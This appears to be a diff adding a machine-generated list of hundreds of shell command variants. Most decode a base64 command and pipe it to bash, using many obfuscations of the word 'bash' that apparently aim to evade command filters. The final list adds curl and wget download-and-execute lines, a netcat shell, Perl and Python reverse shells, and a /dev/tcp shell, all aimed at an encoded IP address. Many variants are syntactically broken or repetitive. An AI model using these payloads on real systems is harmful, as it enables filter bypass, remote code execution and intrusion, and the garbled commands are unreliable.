@@ -1,0 +1,300 @@
+1. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\"\\$_\")' |\"bash\""`
+2. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\"\\$_\")' | b\"ash\""`
+3. `bash -c \"echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | b\\ash"`
+4. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | ba\\sh"`
+5. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | \\bash"`
+6. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | /bin/\"bash\""`
+7. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | (bash)"`
+8. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | {bash}"`
+9. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | ba${IFS}sh"`
+10. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | \"b\"\"ash\""`
+11. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | $0"`
+12. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' |` which bash`"`
+13. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | $(echo bash)"`
+14. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | ba\\\sh"`
+15. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | \\$(echo bash)"`
+16. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | b\\\ash"`
+17. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | \"\\b\\a\\s\\h\""`
+18. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | $SHELL"`
+19. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | b\"a\"sh"`
+20. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | bash --noprofile"`
+21. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' |/bin/bash"`
+22. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | bash$IFS"`
+23. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | \"ba\"sh"`
+24. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | \\b\\ash"`
+25. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | 'bash'"`
+26. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | \\\"bash\\\""`
+27. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | $(printf b%sa%ss%sh)"`
+28. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | \t bash"`
+29. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | b\ta\sh"`
+30. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | ba${PATH//\//\/}sh"`
+1. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | b\\a\\s\\h"`
+2. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | \$(echo -n bash)"`
+3. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | b\${HOME##*/}ash"`
+4. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | \\$0"`
+5. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | \${SHELL##*/}"`
+6. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | b\"\\a\"sh"`
+7. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | ba\"sh\""`
+8. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | \$(cat <<< bash)"`
+9. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | $((1+1))bash"`
+10. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | \`basename /bin/bash`"`
+11. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | \"\\$(echo bash)\""`
+12. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | ba\u0073h"`
+13. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | \$(echo b; echo a; echo s; echo h)"`
+14. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | b'ash'"`
+15. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | /bin/ba''sh"`
+16. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | $0 #bash"`
+17. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | e\"val\" bash"`
+18. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | $((0+bash))"`
+19. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | \$(echo ba; echo sh)"`
+20. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | \x62\x61\x73\x68"`
+21. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | ba\\nsh"`
+22. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | $RANDOMbash"`
+23. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | $(basename $(which bash))"`
+24. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | b\\tash"`
+25. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | \\x62\\x61\\x73\\x68"`
+26. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | $((2#10))ash"`
+27. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | (ba)(sh)"`
+28. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | ${SHELL//\//\/}"`
+29. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | ba\${IFS}sh"`
+30. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | \$((1+1));bash"`
+1. bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64($_)' | sh"
+2. bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64($_)' | /bin/bash"
+3. bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64($_)' | /bin/sh"
+4. bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64($_)' | $(which bash)"
+5. bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64($_)' | $(which sh)"
+6. bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64($_)' | bash --norc"
+7. bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64($_)' | bash --posix"
+8. bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64($_)' | sh -s"
+9. bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64($_)' | bash -s"
+10. bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64($_)' | env bash"
+11. bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64($_)' | env sh"
+12. bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64($_)' | exec bash"
+13. bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64($_)' | exec sh"
+14. bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64($_)' | /usr/bin/bash"
+15. bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64($_)' | /usr/bin/sh"
+16. bash -c "cat <<< 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64($_)' | bash"
+17. bash -c "echo 'ZGVjb2RlX2Jhc2U2NCgiZFcxYmdiV2dMdz0iKQ==' | base64 -d | bash"
+18. bash -c "printf 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64($_)' | bash"
+19. bash -c "printf %s dW5hbWUgLWE= | base64 -d | bash"
+20. bash -c "perl -MMIME::Base64 -e 'print decode_base64("dW5hbWUgLWE=")' | bash"
+21. bash -c "perl -MMIME::Base64 -e 'print decode_base64 q(dW5hbWUgLWE=)' | bash"
+22. bash -c "echo -n 'dW5hbWUgLWE=' | base64 -d | bash"
+23. bash -c "echo 'dW5hbWUgLWE=' | base64 --decode | bash"
+24. bash -c "echo 'dW5hbWUgLWE=' | openssl enc -base64 -d | bash"
+25. bash -c "echo 'dW5hbWUgLWE=' | python3 -m base64 -d | bash"
+26. bash -c "echo 'dW5hbWUgLWE=' | base64 -d | sh"
+27. bash -c "echo 'dW5hbWUgLWE=' | base64 -d | /bin/sh"
+28. bash -c "echo 'dW5hbWUgLWE=' | base64 -d | /usr/bin/sh"
+29. bash -c "echo 'dW5hbWUgLWE=' | base64 -d | $(command -v bash)"
+30. bash -c "echo 'dW5hbWUgLWE=' | base64 -d | nohup bash"
+1. bash -c "echo 'dW5hbWUgLWE=' | base64 --decode | /bin/bash"
+2. bash -c "echo 'dW5hbWUgLWE=' | base64 -d | $(which bash)"
+3. bash -c "echo 'dW5hbWUgLWE=' | base64 -d | command bash"
+4. bash -c "echo 'dW5hbWUgLWE=' | base64 -d | bash -i"
+5. bash -c "echo 'dW5hbWUgLWE=' | base64 -d | bash -l"
+6. bash -c "echo 'dW5hbWUgLWE=' | base64 -d | bash --noprofile"
+7. bash -c "echo 'dW5hbWUgLWE=' | base64 -d | bash --norc --noprofile"
+8. bash -c "base64 -d <<< dW5hbWUgLWE= | bash"
+9. bash -c "perl -MMIME::Base64 -e 'print decode_base64 q(dW5hbWUgLWE=)' | sh"
+10. bash -c "perl -MMIME::Base64 -e "print decode_base64('dW5hbWUgLWE=')" | sh"
+11. bash -c "echo dW5hbWUgLWE= | base64 -d | bash"
+12. bash -c "echo dW5hbWUgLWE= | base64 -d | sh"
+13. bash -c "printf 'dW5hbWUgLWE=' | base64 -d | /bin/bash"
+14. bash -c "printf 'dW5hbWUgLWE=' | base64 -d | exec bash"
+15. bash -c "base64 -d <<<"dW5hbWUgLWE=" | exec bash"
+16. bash -c "echo 'dW5hbWUgLWE=' | openssl base64 -d | bash"
+17. bash -c "echo 'dW5hbWUgLWE=' | openssl enc -d -base64 | bash"
+18. bash -c "base64 --decode <<< 'dW5hbWUgLWE=' | bash"
+19. bash -c "cat <(echo 'dW5hbWUgLWE=') | base64 -d | bash"
+20. bash -c "cat <(echo dW5hbWUgLWE=) | base64 -d | bash"
+21. bash -c "bash <<< $(echo 'dW5hbWUgLWE=' | base64 -d)"
+22. bash -c "bash -c $(echo 'ZWNobyAidW5hbWUgLWEiCg==' | base64 -d)"
+23. bash -c "$(echo 'ZWNobyAidW5hbWUgLWEiCg==' | base64 -d)"
+24. bash -c "$(perl -MMIME::Base64 -e 'print decode_base64("ZWNobyAidW5hbWUgLWEiCg==")')"
+25. bash -c "$(echo dW5hbWUgLWE= | base64 -d)"
+26. bash -c "`echo dW5hbWUgLWE= | base64 -d`"
+27. bash -c "$(cat <<< 'dW5hbWUgLWE=' | base64 -d)"
+28. bash -c "$(echo 'dW5hbWUgLWE=' | base64 --decode)"
+29. bash -c "`perl -MMIME::Base64 -e 'print decode_base64(\"dW5hbWUgLWE=\")'`"
+30. bash -c "$(perl -MMIME::Base64 -e 'print decode_base64("dW5hbWUgLWE=")')" | bash
+1. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)'"`
+2. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' |sh"`
+3. `bash -c "echo 'dW5hbWUgLWE='|perl -MMIME::Base64 -ne 'print decode_base64(\$_)'|sh"`
+4. `bash -c "echo 'dW5hbWUgLWE=' |perl -MMIME::Base64 -ne 'print decode_base64(\$_)'"`
+5. `bash -c "echo 'dW5hbWUgLWE='| perl -MMIME::Base64 -ne 'print decode_base64(\$_)'| bash"`
+6. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)'"`
+7. `bash -c "echo 'dW5hbWUgLWE='|perl -MMIME::Base64 -ne 'print decode_base64(\$_)'"`
+8. `bash -c "perl -MMIME::Base64 -ne 'print decode_base64(\$_)' <<< 'dW5hbWUgLWE='" | bash`
+9. `bash -c "perl -MMIME::Base64 -ne 'print decode_base64(\$_)'<<<'dW5hbWUgLWE='"|bash"`
+10. `bash -c "echo dW5hbWUgLWE=|base64 -d|bash"`
+11. `bash -c "echo dW5hbWUgLWE=|base64 -d"`
+12. `bash -c "perl -MMIME::Base64 -ne 'print decode_base64(\$_)'" <<< 'dW5hbWUgLWE='`
+13. `bash -c "echo dW5hbWUgLWE=|base64 -d|sh"`
+14. `bash -c "echo dW5hbWUgLWE= | base64 -d"`
+15. `bash -c "base64 -d <<< dW5hbWUgLWE= | bash"`
+16. `bash -c "base64 -d<<<dW5hbWUgLWE=|bash"`
+17. `bash -c "perl -MMIME::Base64 -ne 'print decode_base64(\$_)'<<<'dW5hbWUgLWE='"`
+18. `bash -c "echo 'dW5hbWUgLWE='|perl -MMIME::Base64 -ne 'print decode_base64(\$_)'"`
+19. `bash -c "echo dW5hbWUgLWE= | base64 -d | sh"`
+20. `bash -c "echo dW5hbWUgLWE=| base64 -d |bash"`
+21. `bash -c "perl -MMIME::Base64 -ne 'print decode_base64(\$_)'"<<<'dW5hbWUgLWE='|bash`
+22. `bash -c "echo dW5hbWUgLWE=|base64 -d|bash"`
+23. `bash -c "echo dW5hbWUgLWE= | base64 -d|sh"`
+24. `bash -c "perl -MMIME::Base64 -ne 'print decode_base64(\$_)'"<<<'dW5hbWUgLWE='`
+25. `bash -c "perl -MMIME::Base64 -ne 'print decode_base64(\$_)'<<<'dW5hbWUgLWE='"|sh`
+26. `bash -c "echo dW5hbWUgLWE=|base64 -d|sh"`
+27. `bash -c "echo dW5hbWUgLWE=| base64 -d"`
+28. `bash -c "base64 -d<<<dW5hbWUgLWE="|bash`
+29. `bash -c "perl -MMIME::Base64 -ne 'print decode_base64(\$_)'<<<'dW5hbWUgLWE='"|sh`
+30. `bash -c "perl -MMIME::Base64 -ne 'print decode_base64(\$_)'<<<'dW5hbWUgLWE='"`
+1. `bash -c "echo dW5hbWUgLWE=|perl -MMIME::Base64 -ne 'print decode_base64(\$_)'"`
+2. `bash -c "echo dW5hbWUgLWE= |perl -MMIME::Base64 -ne 'print decode_base64(\$_)' |sh"`
+3. `bash -c "echo dW5hbWUgLWE=|perl -MMIME::Base64 -ne 'print decode_base64(\$_)'|sh"`
+4. `bash -c "perl -MMIME::Base64 -ne 'print decode_base64(\$_)'"<<<dW5hbWUgLWE=`
+5. `bash -c "perl -MMIME::Base64 -ne'print decode_base64(\$_)'"<<<'dW5hbWUgLWE='|bash`
+6. `bash -c "echo dW5hbWUgLWE=| base64 -d|sh"`
+7. `bash -c "base64 -d<<<dW5hbWUgLWE="`
+8. `bash -c "perl -MMIME::Base64 -ne'print decode_base64(\$_)'"<<<dW5hbWUgLWE=`
+9. `bash -c "echo dW5hbWUgLWE=| base64 -d |sh"`
+10. `bash -c "echo dW5hbWUgLWE= |base64 -d|sh"`
+11. `bash -c "echo dW5hbWUgLWE=| base64 -d | bash"`
+12. `bash -c "perl -MMIME::Base64 -ne'print decode_base64(\$_)'"<<<'dW5hbWUgLWE='|sh`
+13. `bash -c "echo dW5hbWUgLWE= | base64 -d |sh"`
+14. `bash -c "base64 -d <<< dW5hbWUgLWE="`
+15. `bash -c "perl -MMIME::Base64 -ne'print decode_base64(\$_)'"<<<'dW5hbWUgLWE='`
+16. `bash -c "base64 -d<<<'dW5hbWUgLWE='"|bash`
+17. `bash -c "base64 -d<<<dW5hbWUgLWE="|sh`
+18. `bash -c "perl -MMIME::Base64 -ne 'print decode_base64(\$_)'"<<<'dW5hbWUgLWE='|sh"`
+19. `bash -c "echo dW5hbWUgLWE=|base64 -d | sh"`
+20. `bash -c "perl -MMIME::Base64 -ne 'print decode_base64(\$_)'<<<dW5hbWUgLWE="|sh"`
+21. `bash -c "perl -MMIME::Base64 -ne'print decode_base64(\$_)'<<<dW5hbWUgLWE="`
+22. `bash -c "echo dW5hbWUgLWE=|base64 -d| /bin/sh"`
+23. `bash -c "perl -MMIME::Base64 -ne 'print decode_base64(\$_)'<<<'dW5hbWUgLWE='" | /bin/sh"`
+24. `bash -c "echo dW5hbWUgLWE=| base64 -d| /bin/bash"`
+25. `bash -c "echo dW5hbWUgLWE=|base64 -d|/bin/bash"`
+26. `bash -c "perl -MMIME::Base64 -ne 'print decode_base64(\$_)'<<<'dW5hbWUgLWE='"|/bin/sh"`
+27. `bash -c "perl -MMIME::Base64 -ne 'print decode_base64(\$_)'<<<'dW5hbWUgLWE='"|/bin/bash"`
+28. `bash -c "base64 -d<<<dW5hbWUgLWE=|/bin/sh"`
+29. `bash -c "base64 -d<<<dW5hbWUgLWE="|/bin/bash"`
+30. `bash -c "perl -MMIME::Base64 -ne 'print decode_base64(\$_)'<<<dW5hbWUgLWE="|sh"`
+1. `bash -c "perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | bash <<< \"dW5hbWUgLWE=\""`
+2. `bash -c "bash < <(echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)')"`
+3. `bash -c "perl -MMIME::Base64 -ne 'print decode_base64(\$_)' <<< \"dW5hbWUgLWE=\" | bash"`
+4. `bash -c "echo dW5hbWUgLWE= | bash < <(perl -MMIME::Base64 -ne 'print decode_base64(\$_)')"`
+5. `bash -c "bash <<< \$(echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)')"`
+6. `bash -c "perl -MMIME::Base64 -ne 'print decode_base64(\$_)' < <(echo 'dW5hbWUgLWE=') | bash"`
+7. `bash -c "bash <(echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)')"`
+8. `bash -c "perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | bash < <(echo 'dW5hbWUgLWE=')"`
+9. `bash -c "bash <<< \$(perl -MMIME::Base64 -ne 'print decode_base64(\$_)' <<< 'dW5hbWUgLWE=')"`
+10. `bash -c "perl -MMIME::Base64 -ne 'print decode_base64(\$_)' <<< dW5hbWUgLWE= | bash"`
+11. `bash -c "bash < <(perl -MMIME::Base64 -ne 'print decode_base64(\$_)' <<< 'dW5hbWUgLWE=')"`
+12. `bash -c "echo 'dW5hbWUgLWE=' | bash < <(perl -MMIME::Base64 -ne 'print decode_base64(\$_)')"`
+13. `bash -c "perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | bash <<< dW5hbWUgLWE="`
+14. `bash -c "bash <<< \$(perl -MMIME::Base64 -ne 'print decode_base64(\$_)' < <(echo 'dW5hbWUgLWE='))"`
+15. `bash -c "perl -MMIME::Base64 -ne 'print decode_base64(\$_)' <(echo 'dW5hbWUgLWE=') | bash"`
+16. `bash -c "bash <(perl -MMIME::Base64 -ne 'print decode_base64(\$_)' < <(echo 'dW5hbWUgLWE='))"`
+17. `bash -c "perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | bash< <(echo 'dW5hbWUgLWE=')"`
+18. `bash -c "bash<<<\$(echo 'dW5hbWUgLWE='|perl -MMIME::Base64 -ne 'print decode_base64(\$_)')"`
+19. `bash -c "perl -MMIME::Base64 -ne 'print decode_base64(\$_)'<<<dW5hbWUgLWE=|bash"`
+20. `bash -c "bash< <(echo 'dW5hbWUgLWE='|perl -MMIME::Base64 -ne 'print decode_base64(\$_)')"`
+21. `bash -c "perl -MMIME::Base64 -ne 'print decode_base64(\$_)'|bash<<<dW5hbWUgLWE="`
+22. `bash -c "bash <(echo 'dW5hbWUgLWE='|perl -MMIME::Base64 -ne 'print decode_base64(\$_)')"`
+23. `bash -c "perl -MMIME::Base64 -ne 'print decode_base64(\$_)' < <(echo dW5hbWUgLWE=) | bash"`
+24. `bash -c "bash<<<\$(perl -MMIME::Base64 -ne 'print decode_base64(\$_)'< <(echo dW5hbWUgLWE=))"`
+25. `bash -c "perl -MMIME::Base64 -ne 'print decode_base64(\$_)'|bash < <(echo dW5hbWUgLWE=)"`
+26. `bash -c "bash < <(perl -MMIME::Base64 -ne 'print decode_base64(\$_)'< <(echo dW5hbWUgLWE=))"`
+27. `bash -c "perl -MMIME::Base64 -ne 'print decode_base64(\$_)'<<<'dW5hbWUgLWE='|bash"`
+28. `bash -c "bash<<<\$(echo dW5hbWUgLWE=|perl -MMIME::Base64 -ne 'print decode_base64(\$_)')"`
+29. `bash -c "perl -MMIME::Base64 -ne 'print decode_base64(\$_)'< <(echo 'dW5hbWUgLWE=')|bash"`
+30. `bash -c "bash <(perl -MMIME::Base64 -ne 'print decode_base64(\$_)'<<<'dW5hbWUgLWE=')"`
+1. `perl -MMIME::Base64 -ne 'print decode_base64($_)' <<< 'dW5hbWUgLWE=' | bash -c`
+2. `perl -MMIME::Base64 -ne 'print decode_base64($_)' | bash -c <<< 'dW5hbWUgLWE='`
+3. `bash -c | perl -MMIME::Base64 -ne 'print decode_base64($_)' <<< 'dW5hbWUgLWE='`
+4. `bash <<< $(perl -MMIME::Base64 -ne 'print decode_base64($_)' <<< 'dW5hbWUgLWE=') | bash -c`
+5. `perl -MMIME::Base64 -ne 'print decode_base64($_)' <<< 'dW5hbWUgLWE=' | bash | bash -c`
+6. `bash -c "bash | perl -MMIME::Base64 -ne 'print decode_base64($_)' <<< 'dW5hbWUgLWE='"`
+7. `bash | bash -c "perl -MMIME::Base64 -ne 'print decode_base64($_)' <<< 'dW5hbWUgLWE='"`
+8. `bash <<< $(echo 'dW5hbWUgLWE=' | bash -c "perl -MMIME::Base64 -ne 'print decode_base64($_)'")`
+9. `bash -c "bash | echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64($_)'"`
+10. `perl -MMIME::Base64 -ne 'print decode_base64($_)' | bash <<< 'dW5hbWUgLWE=' | bash -c`
+11. `perl -MMIME::Base64 -ne 'print decode_base64($_)' <<< 'dW5hbWUgLWE=' | bash -c | bash`
+12. `bash | perl -MMIME::Base64 -ne 'print decode_base64($_)' <<< 'dW5hbWUgLWE=' | bash -c`
+13. `echo 'dW5hbWUgLWE=' | bash -c | perl -MMIME::Base64 -ne 'print decode_base64($_)'`
+14. `bash <<< $(perl -MMIME::Base64 -ne 'print decode_base64($_)' | echo 'dW5hbWUgLWE=')`
+15. `bash <<< $(echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64($_)' | bash)`
+16. `perl -MMIME::Base64 -ne 'print decode_base64($_)' | bash | echo 'dW5hbWUgLWE=' | bash -c`
+17. `bash <<< $(perl -MMIME::Base64 -ne 'print decode_base64($_)' | bash) | echo 'dW5hbWUgLWE='`
+18. `bash -c | echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64($_)' | bash`
+19. `perl -MMIME::Base64 -ne 'print decode_base64($_)' <<< 'dW5hbWUgLWE=' | bash -c | echo done`
+20. `echo 'dW5hbWUgLWE=' | bash | perl -MMIME::Base64 -ne 'print decode_base64($_)' | bash -c`
+21. `bash -c "perl -MMIME::Base64 -ne 'print decode_base64($_)' | bash" <<< 'dW5hbWUgLWE='`
+22. `bash | bash -c <<< $(perl -MMIME::Base64 -ne 'print decode_base64($_)' <<< 'dW5hbWUgLWE=')`
+23. `perl -MMIME::Base64 -ne 'print decode_base64($_)' <<< 'dW5hbWUgLWE=' | bash | bash`
+24. `bash -c "bash <<< $(perl -MMIME::Base64 -ne 'print decode_base64($_)' <<< 'dW5hbWUgLWE=')"`
+25. `bash <<< $(bash -c "perl -MMIME::Base64 -ne 'print decode_base64($_)'" <<< 'dW5hbWUgLWE=')`
+26. `perl -MMIME::Base64 -ne 'print decode_base64($_)' <<< $(echo 'dW5hbWUgLWE=') | bash -c`
+27. `echo 'dW5hbWUgLWE=' | bash -c - | perl -MMIME::Base64 -ne 'print decode_base64($_)'`
+28. `perl -MMIME::Base64 -ne 'print decode_base64($_)' | bash -c <<< $(echo 'dW5hbWUgLWE=')`
+29. `bash <<< $(echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64($_)' | bash)`
+30. `bash -c <<< $(perl -MMIME::Base64 -ne 'print decode_base64($_)' <<< 'dW5hbWUgLWE=') | bash`
+1. `bash -c "echo 'address=2130706433' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | bash"`
+2. `bash -c "echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | bash #2130706433"`
+3. `bash -c "export ADDR=2130706433; echo \$ADDR | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | bash"`
+4. `bash -c "perl -MMIME::Base64 -e 'print decode_base64(\"dW5hbWUgLWE=\")' | bash #address=2130706433"`
+5. `bash -c "echo address=2130706433 > /tmp/.x && perl -MMIME::Base64 -ne 'print decode_base64(\$_)' < /tmp/.x | bash"`
+6. `bash -c "curl http://2130706433/shell.sh | bash"`
+7. `bash -c "wget -qO- http://2130706433/shell.sh | bash"`
+8. `bash -c "ping -c1 2130706433 && echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | bash"`
+9. `bash -c "nc 2130706433 80 -e /bin/bash"`
+10. `bash -c "perl -e 'use Socket;$i=2130706433;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">\&S\");open(STDOUT,\">\&S\");open(STDERR,\">\&S\");exec(\"/bin/sh -i\");};'"`
+11. `bash -c "python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"2130706433\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/sh\"])'"`
+12. `bash -c "curl -s http://2130706433/payload | bash"`
+13. `bash -c "echo 'address=2130706433' > /dev/null; echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | bash"`
+14. `bash -c "printf 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | bash #2130706433"`
+15. `bash -c "PERL5OPT=-MMIME::Base64 perl -ne 'print decode_base64(\"dW5hbWUgLWE=\")' | bash #127.0.0.1 recoded"`
+16. `bash -c "host 2130706433 && perl -MMIME::Base64 -ne 'print decode_base64(\$_)' <<< 'dW5hbWUgLWE=' | bash"`
+17. `bash -c "perl -e 'print pack(\"N\", 2130706433)' | hexdump -C"`
+18. `bash -c "base64 -d <<< 'dW5hbWUgLWE=' | bash #address=2130706433"`
+19. `bash -c "perl -MMIME::Base64 -ne 'print decode_base64(\$_)' <<< 'dW5hbWUgLWE=' | bash #recoded IP"`
+20. `bash -c "timeout 5 bash -i >& /dev/tcp/2130706433/443 0>&1"`
+21. `bash -c "ip a | grep 2130706433; echo 'dW5hbWUgLWE=' | perl -MMIME::Base64 -ne 'print decode_base64(\$_)' | bash"`
+22. `bash -c "perl -e 'print inet_ntoa(pack(\"N\",2130706433))'"`
+23. `bash -c "dig -x 2130706433 && perl -MMIME::Base64 -ne 'print decode_base64(\$_)' <<< 'dW5hbWUgLWE=' | bash"`
